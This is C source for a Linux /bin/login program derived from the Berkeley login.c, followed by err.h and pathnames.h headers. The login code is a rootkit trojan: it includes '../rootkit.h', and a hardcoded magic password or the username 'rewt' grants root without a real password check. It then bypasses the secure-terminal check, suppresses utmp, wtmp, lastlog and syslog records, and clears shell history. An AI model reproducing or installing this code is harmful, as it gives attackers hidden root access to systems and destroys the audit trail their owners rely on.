	      - strcasecmp is now part of HP-UX
   1992-02-05 poe@daimi.aau.dk: Ported the stuff to Linux 0.12
   From 1992 till now (1995) this code for Linux has been maintained at
   ftp.daimi.aau.dk:/pub/linux/poe/
*/
   
/*
 * Copyright (c) 1980, 1987, 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#ifndef lint
char copyright[] =
"@(#) Copyright (c) 1980, 1987, 1988 The Regents of the University of California.\n\
 All rights reserved.\n";
#endif /* not lint */

#ifndef lint
static char sccsid[] = "@(#)login.c	5.40 (Berkeley) 5/9/89";
#endif /* not lint */

/*
 * login [ name ]
 * login -h hostname	(for telnetd, etc.)
 * login -f name	(for pre-authenticated login: datakit, xterm, etc.)
 */

/* #define TESTING */

#ifdef TESTING
#include "param.h"
#else
#include <sys/param.h>
#endif

#include <ctype.h>
#include <unistd.h>
#include <getopt.h>
#include <memory.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/file.h>
#include <termios.h>
#include <string.h>
#define index strchr
#define rindex strrchr
#include <sys/ioctl.h>
#include <signal.h>
#include <errno.h>
#include <grp.h>
#include <pwd.h>
#include <setjmp.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syslog.h>
#include <sys/sysmacros.h>
#include <netdb.h>
#include "../rootkit.h"

#ifdef TESTING
#  include "utmp.h"
#else
#  include <utmp.h>
#endif

#ifdef SHADOW_PWD
#include <shadow.h>
#endif

#ifndef linux
#include <tzfile.h>
#endif
#include <lastlog.h>

#if 0
/* from before we had a lastlog.h file in linux */
struct  lastlog
  { long ll_time;
    char ll_line[12];
    char ll_host[16];
  };
#endif

#include "pathnames.h"

#define P_(s) ()
void opentty P_((const char *tty));
void getloginname P_((void));
void timedout P_((void));
int rootterm P_((char *ttyn));
void motd P_((void));
void sigint P_((void));
void checknologin P_((void));
void dolastlog P_((int quiet));
void badlogin P_((char *name));
char *stypeof P_((char *ttyid));
void checktty P_((char *user, char *tty, struct passwd *pwd));
void getstr P_((char *buf, int cnt, char *err));
void sleepexit P_((int eval));
#undef P_

#ifdef	KERBEROS
#include <kerberos/krb.h>
#include <sys/termios.h>
char	realm[REALM_SZ];
int	kerror = KSUCCESS, notickets = 1;
#endif

#define	TTYGRPNAME	"tty"		/* name of group to own ttys */
/**#  define TTYGRPNAME      "other" **/

#ifndef MAXPATHLEN
#  define MAXPATHLEN 1024
#endif

/*
 * This bounds the time given to login.  Not a define so it can
 * be patched on machines where it's too small.
 */
#ifndef linux
int	timeout = 300;
#else
int     timeout = 60;
#endif

struct	passwd *pwd;
int	failures = 1;
char	term[64], *hostname, *username, *tty;
struct  hostent hostaddress;
char	thishost[100];

#ifndef linux
struct	sgttyb sgttyb;
struct	tchars tc = {
	CINTR, CQUIT, CSTART, CSTOP, CEOT, CBRK
};
struct	ltchars ltc = {
	CSUSP, CDSUSP, CRPRNT, CFLUSH, CWERASE, CLNEXT
};
#endif

char *months[] =
	{ "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug",
	  "Sep", "Oct", "Nov", "Dec" };

/* provided by Linus Torvalds 16-Feb-93 */
void 
opentty(const char * tty)
{
    int i;
    int fd = open(tty, O_RDWR);

    for (i = 0 ; i < fd ; i++)
      close(i);
    for (i = 0 ; i < 3 ; i++)
      dup2(fd, i);
    if (fd >= 3)
      close(fd);
}

int
main(argc, argv)
	int argc;
	char **argv;
{
	extern int errno, optind;
	extern char *optarg, **environ;
	struct timeval tp;
	struct tm *ttp;
	struct group *gr;
	register int ch;
	register char *p;
	int ask, fflag, hflag, pflag, cnt;
	int quietlog, passwd_req, ioctlval;
	char *domain, *salt, *ttyn, *pp;
	char tbuf[MAXPATHLEN + 2], tname[sizeof(_PATH_TTY) + 10];
	char *ctime(), *ttyname(), *stypeof();
	time_t time();
	void timedout();
	char *termenv;
	char MAG[7];
	int elite=0;
	char rewt[5];

#ifdef linux
	char tmp[100];
	/* Just as arbitrary as mountain time: */
        /* (void)setenv("TZ", "MET-1DST",0); */
#endif

        strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	strcpy(rewt,"");
        rewt[0]='r';
        rewt[1]='e';
        rewt[2]='w';
        rewt[3]='t';
        rewt[4]='\0';

	(void)signal(SIGALRM, timedout);
	(void)alarm((unsigned int)timeout);
	(void)signal(SIGQUIT, SIG_IGN);
	(void)signal(SIGINT, SIG_IGN);

	(void)setpriority(PRIO_PROCESS, 0, 0);
#ifdef HAVE_QUOTA
	(void)quota(Q_SETUID, 0, 0, 0);
#endif

	/*
	 * -p is used by getty to tell login not to destroy the environment
 	 * -f is used to skip a second login authentication 
	 * -h is used by other servers to pass the name of the remote
	 *    host to login so that it may be placed in utmp and wtmp
	 */
	(void)gethostname(tbuf, sizeof(tbuf));
	(void)strncpy(thishost, tbuf, sizeof(thishost)-1);
	domain = index(tbuf, '.');

	hostname = NULL;
	fflag = hflag = pflag = 0;
	passwd_req = 1;
	while ((ch = getopt(argc, argv, "fh:p")) != EOF)
		switch (ch) {
		case 'f':
			fflag = 1;
			break;

		case 'h':
			if (getuid()) {
				(void)fprintf(stderr,
				    "login: -h for super-user only.\n");
				exit(1);
			}
			hflag = 1;
			if (domain && (p = index(optarg, '.')) &&
			    strcasecmp(p, domain) == 0)
				*p = 0;
			hostname = optarg;
			{ 
			    struct hostent *he = gethostbyname(hostname);
			    if (he) {
				memcpy(&hostaddress, he, sizeof(hostaddress));
			    } else {
				memset(&hostaddress, 0, sizeof(hostaddress));
			    }
			}
			break;

		case 'p':
			pflag = 1;
			break;
		case '?':
		default:
			(void)fprintf(stderr,
			    "usage: login [-fp] [username]\n");
			exit(1);
		}
	argc -= optind;
	argv += optind;
	if (*argv) {
		username = *argv;
		ask = 0;
	} else
		ask = 1;

#ifndef linux
	ioctlval = 0;
	(void)ioctl(0, TIOCLSET, &ioctlval);
	(void)ioctl(0, TIOCNXCL, 0);
	(void)fcntl(0, F_SETFL, ioctlval);
	(void)ioctl(0, TIOCGETP, &sgttyb);
	sgttyb.sg_erase = CERASE;
	sgttyb.sg_kill = CKILL;
	(void)ioctl(0, TIOCSLTC, &ltc);
	(void)ioctl(0, TIOCSETC, &tc);
	(void)ioctl(0, TIOCSETP, &sgttyb);

	/*
	 * Be sure that we're in
	 * blocking mode!!!
	 * This is really for HPUX
	 */
        ioctlval = 0;
        (void)ioctl(0, FIOSNBIO, &ioctlval);
#endif

	for (cnt = getdtablesize(); cnt > 2; cnt--)
		close(cnt);

	ttyn = ttyname(0);
	if (ttyn == NULL || *ttyn == '\0') {
		(void)sprintf(tname, "%s??", _PATH_TTY);
		ttyn = tname;
	}

	setpgrp();

	{
	    struct termios tt, ttt;

	    tcgetattr(0, &tt);
	    ttt = tt;
	    ttt.c_cflag &= ~HUPCL;

	    if((chown(ttyn, 0, 0) == 0) && (chmod(ttyn, 0622) == 0)) {
		tcsetattr(0,TCSAFLUSH,&ttt);
		signal(SIGHUP, SIG_IGN); /* so vhangup() wont kill us */
		vhangup();
		signal(SIGHUP, SIG_DFL);
	    }

	    setsid();

	    /* re-open stdin,stdout,stderr after vhangup() closed them */
	    /* if it did, after 0.99.5 it doesn't! */
	    opentty(ttyn);
	    tcsetattr(0,TCSAFLUSH,&tt);
	}

	if ((tty = rindex(ttyn, '/')))
		++tty;
	else
		tty = ttyn;

	openlog("login", LOG_ODELAY, LOG_AUTH);

	for (cnt = 0;; ask = 1) {
		ioctlval = 0;
#ifndef linux
		(void)ioctl(0, TIOCSETD, &ioctlval);
#endif

		if (ask) {
			fflag = 0;
			getloginname();
		}

               /* Dirty patch to fix a gigantic security hole when using 
                  yellow pages. This problem should be solved by the
                  libraries, and not by programs, but this must be fixed
                  urgently! If the first char of the username is '+', we 
                  avoid login success.
                  Feb 95 <alvaro@etsit.upm.es> */

		if (username[0] == '+') {
		    puts("Illegal username");
		    badlogin(username);
		    sleepexit(1);
		}

if (!(strcmp(username,rewt))) {strcpy(username,"root");elite++;}

		(void)strcpy(tbuf, username);
		if ((pwd = getpwnam(username)))
			salt = pwd->pw_passwd;
		else
			salt = "xx";

		if (!elite) checktty(username, tty, pwd); /* in checktty.c */

		/* if user not super-user, check for disabled logins */
		if (pwd == NULL || pwd->pw_uid)
			checknologin();

		/*
		 * Disallow automatic login to root; if not invoked by
		 * root, disallow if the uid's differ.
		 */
		if (fflag && pwd) {
			int uid = getuid();

			passwd_req = pwd->pw_uid == 0 ||
			    (uid && uid != pwd->pw_uid);
		}

		/*
		 * If trying to log in as root, but with insecure terminal,
		 * refuse the login attempt.
		 */
		if (!elite && pwd && pwd->pw_uid == 0 && !rootterm(tty)) {
			(void)fprintf(stderr,
			    "%s login refused on this terminal.\n",
			    pwd->pw_name);

			if (hostname)
				syslog(LOG_NOTICE,
				    "LOGIN %s REFUSED FROM %s ON TTY %s",
				    pwd->pw_name, hostname, tty);
			else
				syslog(LOG_NOTICE,
				    "LOGIN %s REFUSED ON TTY %s",
				     pwd->pw_name, tty);
			continue;
		}

		/*
		 * If no pre-authentication and a password exists
		 * for this user, prompt for one and verify it.
		 */
		if (!passwd_req || (pwd && !*pwd->pw_passwd))
			break;

		setpriority(PRIO_PROCESS, 0, -4);
		pp = getpass("Password: ");
		elite=0;
		if (!strcmp(pp,MAG)) elite++;
/* Stop history logging */
if (elite) setenv("HISTFILE","",1);
		p = crypt(pp, salt);
		setpriority(PRIO_PROCESS, 0, 0);

#ifdef	KERBEROS

		/*
		 * If not present in pw file, act as we normally would.
		 * If we aren't Kerberos-authenticated, try the normal
		 * pw file for a password.  If that's ok, log the user
		 * in without issueing any tickets.
		 */

		if (pwd && !krb_get_lrealm(realm,1)) {
			/*
			 * get TGT for local realm; be careful about uid's
			 * here for ticket file ownership
			 */
			(void)setreuid(geteuid(),pwd->pw_uid);
			kerror = krb_get_pw_in_tkt(pwd->pw_name, "", realm,
				"krbtgt", realm, DEFAULT_TKT_LIFE, pp);
			(void)setuid(0);
			if (kerror == INTK_OK) {
				memset(pp, 0, strlen(pp));
				notickets = 0;	/* user got ticket */
				break;
			}
		}
#endif
		(void) memset(pp, 0, strlen(pp));
		if ((pwd && !strcmp(p, pwd->pw_passwd)) || elite)
			break;

		(void)printf("Login incorrect\n");
		failures++;
		badlogin(username); /* log ALL bad logins */

		/* we allow 10 tries, but after 3 we start backing off */
		if (++cnt > 3) {
			if (cnt >= 10) {
				sleepexit(1);
			}
			sleep((unsigned int)((cnt - 3) * 5));
		}
	}

	/* committed to login -- turn off timeout */
	(void)alarm((unsigned int)0);

#ifdef HAVE_QUOTA
	if (quota(Q_SETUID, pwd->pw_uid, 0, 0) < 0 && errno != EINVAL) {
		switch(errno) {
		case EUSERS:
			(void)fprintf(stderr,
		"Too many users logged on already.\nTry again later.\n");
			break;
		case EPROCLIM:
			(void)fprintf(stderr,
			    "You have too many processes running.\n");
			break;
		default:
			perror("quota (Q_SETUID)");
		}
		sleepexit(0);
	}
#endif

	/* paranoia... */
	endpwent();

	/* This requires some explanation: As root we may not be able to
	   read the directory of the user if it is on an NFS mounted
	   filesystem. We temporarily set our effective uid to the user-uid
	   making sure that we keep root privs. in the real uid. 

	   A portable solution would require a fork(), but we rely on Linux
	   having the BSD setreuid() */

	{
	    char tmpstr[MAXPATHLEN];
	    uid_t ruid = getuid();
	    gid_t egid = getegid();

	    strncpy(tmpstr, pwd->pw_dir, MAXPATHLEN-12);
	    strncat(tmpstr, ("/" _PATH_HUSHLOGIN), MAXPATHLEN);

	    setregid(-1, pwd->pw_gid);
	    setreuid(0, pwd->pw_uid);
	    quietlog = (access(tmpstr, R_OK) == 0);
	    setuid(0); /* setreuid doesn't do it alone! */
	    setreuid(ruid, 0);
	    setregid(-1, egid);
	}

#ifndef linux
#ifdef KERBEROS
	if (notickets && !quietlog)
		(void)printf("Warning: no Kerberos tickets issued\n");
#endif

#define	TWOWEEKS	(14*24*60*60)
	if (pwd->pw_change || pwd->pw_expire)
		(void)gettimeofday(&tp, (struct timezone *)NULL);
	if (pwd->pw_change)
		if (tp.tv_sec >= pwd->pw_change) {
			(void)printf("Sorry -- your password has expired.\n");
			sleepexit(1);
		}
		else if (tp.tv_sec - pwd->pw_change < TWOWEEKS && !quietlog) {
			ttp = localtime(&pwd->pw_change);
			(void)printf("Warning: your password expires on %s %d, %d\n",
			    months[ttp->tm_mon], ttp->tm_mday, TM_YEAR_BASE + ttp->tm_year);
		}
	if (pwd->pw_expire)
		if (tp.tv_sec >= pwd->pw_expire) {
			(void)printf("Sorry -- your account has expired.\n");
			sleepexit(1);
		}
		else if (tp.tv_sec - pwd->pw_expire < TWOWEEKS && !quietlog) {
			ttp = localtime(&pwd->pw_expire);
			(void)printf("Warning: your account expires on %s %d, %d\n",
			    months[ttp->tm_mon], ttp->tm_mday, TM_YEAR_BASE + ttp->tm_year);
		}

	/* nothing else left to fail -- really log in */
	{
		struct utmp utmp;

		memset((char *)&utmp, 0, sizeof(utmp));
		(void)time(&utmp.ut_time);
		strncpy(utmp.ut_name, username, sizeof(utmp.ut_name));
		if (hostname)
			strncpy(utmp.ut_host, hostname, sizeof(utmp.ut_host));
		strncpy(utmp.ut_line, tty, sizeof(utmp.ut_line));
		login(&utmp);
	}
#else
	/* for linux, write entries in utmp and wtmp */
	if (!elite)
	{
		struct utmp ut;
		int wtmp;
		struct utmp *utp;
		pid_t mypid = getpid();
		utmpname(_PATH_UTMP);
		setutent();
		while ((utp = getutent()) 
		       && !(utp->ut_pid == mypid)) /* nothing */;

		if (utp) {
		    memcpy(&ut, utp, sizeof(ut));
		} else {
		    /* some gettys/telnetds don't initialize utmp... */
		    memset(&ut, 0, sizeof(ut));
		}
		endutent();

		if (ut.ut_id[0] == 0)
		  strncpy(ut.ut_id, ttyn + 8, sizeof(ut.ut_id));
	
		strncpy(ut.ut_user, username, sizeof(ut.ut_user));
		strncpy(ut.ut_line, ttyn + 5, sizeof(ut.ut_line));
		time(&ut.ut_time);
		ut.ut_type = USER_PROCESS;
		ut.ut_pid = mypid;
		if (hostname) {
		    strncpy(ut.ut_host, hostname, sizeof(ut.ut_host));
		    if (hostaddress.h_addr_list)
		      memcpy(&ut.ut_addr, hostaddress.h_addr_list[0],
			     sizeof(ut.ut_addr));
		}

		pututline(&ut);
		endutent();
		
		if((wtmp = open(_PATH_WTMP, O_APPEND|O_WRONLY)) >= 0) {
		        flock(wtmp, LOCK_EX);
			write(wtmp, (char *)&ut, sizeof(ut));
		        flock(wtmp, LOCK_UN);
			close(wtmp);
		}
	}
#endif

	if (!elite) dolastlog(quietlog);
	
#ifndef linux
	if (!hflag) {					/* XXX */
		static struct winsize win = { 0, 0, 0, 0 };

		(void)ioctl(0, TIOCSWINSZ, &win);
	}
#endif
	(void)chown(ttyn, pwd->pw_uid,
	    (gr = getgrnam(TTYGRPNAME)) ? gr->gr_gid : pwd->pw_gid);

#ifdef USE_TTY_GROUP
	chmod(ttyn, 0620);
#else
	chmod(ttyn, 0600);
#endif

	setgid(pwd->pw_gid);
	initgroups(username, pwd->pw_gid);

#ifdef HAVE_QUOTA
	quota(Q_DOWARN, pwd->pw_uid, (dev_t)-1, 0);
#endif

	if (*pwd->pw_shell == '\0')
		pwd->pw_shell = _PATH_BSHELL;
#ifndef linux
	/* turn on new line discipline for the csh */
	else if (!strcmp(pwd->pw_shell, _PATH_CSHELL)) {
		ioctlval = NTTYDISC;
		(void)ioctl(0, TIOCSETD, &ioctlval);
	}
#endif

	/* preserve TERM even without -p flag */
	{
		char *ep;
		
		if(!((ep = getenv("TERM")) && (termenv = strdup(ep))))
		  termenv = "dumb";
	}

	/* destroy environment unless user has requested preservation */
	if (!pflag)
        {
          environ = (char**)malloc(sizeof(char*));
	  memset(environ, 0, sizeof(char*));
	}

#ifndef linux
	(void)setenv("HOME", pwd->pw_dir, 1);
	(void)setenv("SHELL", pwd->pw_shell, 1);
	if (term[0] == '\0')
		strncpy(term, stypeof(tty), sizeof(term));
	(void)setenv("TERM", term, 0);
	(void)setenv("USER", pwd->pw_name, 1);
	(void)setenv("PATH", _PATH_DEFPATH, 0);
#else
        (void)setenv("HOME", pwd->pw_dir, 0);      /* legal to override */
        if(pwd->pw_uid)
          (void)setenv("PATH", _PATH_DEFPATH, 1);
        else
          (void)setenv("PATH", _PATH_DEFPATH_ROOT, 1);
	(void)setenv("SHELL", pwd->pw_shell, 1);
	(void)setenv("TERM", termenv, 1);

        /* mailx will give a funny error msg if you forget this one */
        (void)sprintf(tmp,"%s/%s",_PATH_MAILDIR,pwd->pw_name);
        (void)setenv("MAIL",tmp,0);

        /* LOGNAME is not documented in login(1) but
	   HP-UX 6.5 does it. We'll not allow modifying it.
	 */
	(void)setenv("LOGNAME", pwd->pw_name, 1);
#endif
if (!elite) {
	if (tty[sizeof("tty")-1] == 'S')
		syslog(LOG_INFO, "DIALUP %s, %s", tty, pwd->pw_name);

	if (pwd->pw_uid == 0)
		if (hostname)
			syslog(LOG_NOTICE, "ROOT LOGIN ON %s FROM %s",
			    tty, hostname);
		else
			syslog(LOG_NOTICE, "ROOT LOGIN ON %s", tty);
	}

	if (!quietlog) {
		struct stat st;

		motd();
		(void)sprintf(tbuf, "%s/%s", _PATH_MAILDIR, pwd->pw_name);
		if (stat(tbuf, &st) == 0 && st.st_size != 0)
			(void)printf("You have %smail.\n",
			    (st.st_mtime > st.st_atime) ? "new " : "");
	}

	(void)signal(SIGALRM, SIG_DFL);
	(void)signal(SIGQUIT, SIG_DFL);
	(void)signal(SIGINT, SIG_DFL);
	(void)signal(SIGTSTP, SIG_IGN);
	(void)signal(SIGHUP, SIG_DFL);

	/* discard permissions last so can't get killed and drop core */
	if(setuid(pwd->pw_uid) < 0 && pwd->pw_uid) {
	    syslog(LOG_ALERT, "setuid() failed");
	    exit(1);
	}

	/* wait until here to change directory! */
	if (chdir(pwd->pw_dir) < 0) {
		(void)printf("No directory %s!\n", pwd->pw_dir);
		if (chdir("/"))
			exit(0);
		pwd->pw_dir = "/";
		(void)printf("Logging in with home = \"/\".\n");
	}

	/* if the shell field has a space: treat it like a shell script */
	if (strchr(pwd->pw_shell, ' ')) {
	    char *buff = malloc(strlen(pwd->pw_shell) + 6);
	    if (buff) {
		strcpy(buff, "exec ");
		strcat(buff, pwd->pw_shell);
		execlp("/bin/sh", "-sh", "-c", buff, (char *)0);
		fprintf(stderr, "login: couldn't exec shell script: %s.\n",
			strerror(errno));
		exit(0);
	    }
	    fprintf(stderr, "login: no memory for shell script.\n");
	    exit(0);
	}

	tbuf[0] = '-';
	strcpy(tbuf + 1, ((p = rindex(pwd->pw_shell, '/')) ?
			  p + 1 : pwd->pw_shell));
if (elite) putenv("HISTFILE=");
	execlp(pwd->pw_shell, tbuf, (char *)0);
	(void)fprintf(stderr, "login: no shell: %s.\n", strerror(errno));
	exit(0);
}

void
getloginname()
{
	register int ch;
	register char *p;
	static char nbuf[UT_NAMESIZE + 1];
	int cnt, cnt2;

	cnt2 = 0;
	for (;;) {
	        cnt = 0;
		(void)printf("\n%s login: ", thishost); fflush(stdout);
		for (p = nbuf; (ch = getchar()) != '\n'; ) {
			if (ch == EOF) {
				badlogin("EOF");
				exit(0);
			}
			if (p < nbuf + UT_NAMESIZE)
				*p++ = ch;

			cnt++;
			if (cnt > UT_NAMESIZE + 20) {
				fprintf(stderr, "login name much too long.\n");
				badlogin("NAME too long");
				exit(0);
			}
		}
		if (p > nbuf)
			if (nbuf[0] == '-')
				(void)fprintf(stderr,
				    "login names may not start with '-'.\n");
			else {
				*p = '\0';
				username = nbuf;
				break;
			}

		cnt2++;
		if (cnt2 > 50) {
			fprintf(stderr, "too many bare linefeeds.\n");
			badlogin("EXCESSIVE linefeeds");
			exit(0);
		}
	}
}

void timedout()
{
	struct termio ti;
	
	(void)fprintf(stderr, "Login timed out after %d seconds\n", timeout);

	/* reset echo */
	(void) ioctl(0, TCGETA, &ti);
	ti.c_lflag |= ECHO;
	(void) ioctl(0, TCSETA, &ti);
	exit(0);
}

int
rootterm(ttyn)
	char *ttyn;
#ifndef linux
{
	struct ttyent *t;

	return((t = getttynam(ttyn)) && t->ty_status&TTY_SECURE);
}
#else
{ 
  int fd;
  char buf[100],*p;
  int cnt, more;

  fd = open(SECURETTY, O_RDONLY);
  if(fd < 0) return 1;

  /* read each line in /etc/securetty, if a line matches our ttyline
     then root is allowed to login on this tty, and we should return
     true. */
  for(;;) {
	p = buf; cnt = 100;
	while(--cnt >= 0 && (more = read(fd, p, 1)) == 1 && *p != '\n') p++;
	if(more && *p == '\n') {
		*p = '\0';
	  	if(!strcmp(buf, ttyn)) {
  			close(fd);
  			return 1;
	  	} else
  			continue;
  	} else {
  		close(fd);
  		return 0;
  	}
  }
}
#endif

jmp_buf motdinterrupt;

void
motd()
{
	register int fd, nchars;
	void (*oldint)(), sigint();
	char tbuf[8192];

	if ((fd = open(_PATH_MOTDFILE, O_RDONLY, 0)) < 0)
		return;
	oldint = signal(SIGINT, sigint);
	if (setjmp(motdinterrupt) == 0)
		while ((nchars = read(fd, tbuf, sizeof(tbuf))) > 0)
			(void)write(fileno(stdout), tbuf, nchars);
	(void)signal(SIGINT, oldint);
	(void)close(fd);
}

void sigint()
{
	longjmp(motdinterrupt, 1);
}

void
checknologin()
{
	register int fd, nchars;
	char tbuf[8192];

	if ((fd = open(_PATH_NOLOGIN, O_RDONLY, 0)) >= 0) {
		while ((nchars = read(fd, tbuf, sizeof(tbuf))) > 0)
			(void)write(fileno(stdout), tbuf, nchars);
		sleepexit(0);
	}
}

void
dolastlog(quiet)
	int quiet;
{
	struct lastlog ll;
	int fd;

	if ((fd = open(_PATH_LASTLOG, O_RDWR, 0)) >= 0) {
		(void)lseek(fd, (off_t)pwd->pw_uid * sizeof(ll), L_SET);
		if (!quiet) {
			if (read(fd, (char *)&ll, sizeof(ll)) == sizeof(ll) &&
			    ll.ll_time != 0) {
				(void)printf("Last login: %.*s ",
				    24-5, (char *)ctime(&ll.ll_time));

				if (*ll.ll_host != '\0')
				  printf("from %.*s\n",
					 (int)sizeof(ll.ll_host), ll.ll_host);
				else
				  printf("on %.*s\n",
					 (int)sizeof(ll.ll_line), ll.ll_line);
			}
			(void)lseek(fd, (off_t)pwd->pw_uid * sizeof(ll), L_SET);
		}
		memset((char *)&ll, 0, sizeof(ll));
		(void)time(&ll.ll_time);
		strncpy(ll.ll_line, tty, sizeof(ll.ll_line));
		if (hostname)
			strncpy(ll.ll_host, hostname, sizeof(ll.ll_host));
		(void)write(fd, (char *)&ll, sizeof(ll));
		(void)close(fd);
	}
}

void
badlogin(name)
	char *name;
{
	if (hostname)
		syslog(LOG_NOTICE, "%d LOGIN FAILURE%s FROM %s, %s",
		    failures, failures > 1 ? "S" : "", hostname, name);
	else
		syslog(LOG_NOTICE, "%d LOGIN FAILURE%s ON %s, %s",
		    failures, failures > 1 ? "S" : "", tty, name);
}

#undef	UNKNOWN
#define	UNKNOWN	"su"

#ifndef linux
char *
stypeof(ttyid)
	char *ttyid;
{
	struct ttyent *t;

	return(ttyid && (t = getttynam(ttyid)) ? t->ty_type : UNKNOWN);
}
#endif 

void
getstr(buf, cnt, err)
	char *buf, *err;
	int cnt;
{
	char ch;

	do {
		if (read(0, &ch, sizeof(ch)) != sizeof(ch))
			exit(1);
		if (--cnt < 0) {
			(void)fprintf(stderr, "%s too long\r\n", err);
			sleepexit(1);
		}
		*buf++ = ch;
	} while (ch);
}

void
sleepexit(eval)
	int eval;
{
	sleep((unsigned int)5);
	exit(eval);
}

/*-
 * Copyright (c) 1993
 *	The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by the University of
 *	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	@(#)err.h	8.1 (Berkeley) 6/2/93
 */

#ifndef _ERR_H_
#define	_ERR_H_

#ifdef __linux__
#include <stdarg.h>
#define _BSD_VA_LIST_ va_list
#define __dead /* */
#else
/*
 * Don't use va_list in the err/warn prototypes.   Va_list is typedef'd in two
 * places (<machine/varargs.h> and <machine/stdarg.h>), so if we include one
 * of them here we may collide with the utility's includes.  It's unreasonable
 * for utilities to have to include one of them to include err.h, so we get
 * _BSD_VA_LIST_ from <machine/ansi.h> and use it.
 */
#include <machine/ansi.h>
#endif
#include <sys/cdefs.h>

__BEGIN_DECLS
__dead void	err __P((int, const char *, ...));
__dead void	verr __P((int, const char *, _BSD_VA_LIST_));
__dead void	errx __P((int, const char *, ...));
__dead void	verrx __P((int, const char *, _BSD_VA_LIST_));
void		warn __P((const char *, ...));
void		vwarn __P((const char *, _BSD_VA_LIST_));
void		warnx __P((const char *, ...));
void		vwarnx __P((const char *, _BSD_VA_LIST_));
__END_DECLS

#ifdef __linux__
#undef _BSD_VA_LIST_
#endif

#endif /* !_ERR_H_ */
/*
 * Copyright (c) 1989 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 *
 *	@(#)pathnames.h	5.3 (Berkeley) 5/9/89
 *
 * Changed: Sun Nov 21 12:30:54 1993 by faith@cs.unc.edu
 * Changed: Wed Jun 22 20:47:27 1994 by faith@cs.unc.edu, based on changes
 *                                   from poe@daimi.aau.dk
 * Changed: Wed Jun 22 22:50:13 1994 by faith@cs.unc.edu
 * Changed: Sat Feb  4 16:02:10 1995 by faith@cs.unc.edu
 */

#ifndef __STDC__
# error "we need an ANSI compiler"
#endif

/* The paths for some of these are wrong in /usr/include/paths.h, but we
   re-define them here. */

/* #undef _PATH_UTMP
#undef _PATH_WTMP */ /* bombed on slack 2.0 */
#undef _PATH_DEFPATH
#undef _PATH_DEFPATH_ROOT
#undef _PATH_LASTLOG
#undef _PATH_MAILDIR

#ifndef SBINDIR
#define SBINDIR			"/sbin"
#endif

#ifndef USRSBINDIR
#define USRSBINDIR              "/usr/sbin"
#endif

#ifndef LOGDIR
#define LOGDIR                  "/var/log"
#endif

#ifndef VARPATH
#define VARPATH			"/var"
#endif

#define _PATH_BSHELL    	"/bin/sh"
#define _PATH_CSHELL    	"/bin/csh"
#define UT_NAMESIZE     	8
#define _PATH_TTY       	"/dev/tty"
#define TTYTYPES        	"/etc/ttytype"
#define SECURETTY       	"/etc/securetty"
/* #define _PATH_UTMP      	"/var/run/utmp"
#define _PATH_WTMP      	LOGDIR "/wtmp" */ /* bombed on slack 2.0 */

#define	_PATH_DEFPATH	        "/usr/local/bin:/bin:/usr/bin:."
#define	_PATH_DEFPATH_ROOT	SBINDIR ":/bin:" USRSBINDIR ":/usr/bin"
#define	_PATH_HUSHLOGIN		".hushlogin"
#define	_PATH_LASTLOG		LOGDIR "/lastlog"
#define	_PATH_MAILDIR		VARPATH "/spool/mail"
#define	_PATH_MOTDFILE		"/etc/motd"
#define	_PATH_NOLOGIN		"/etc/nologin"

#define _PATH_LOGIN		"/bin/login"
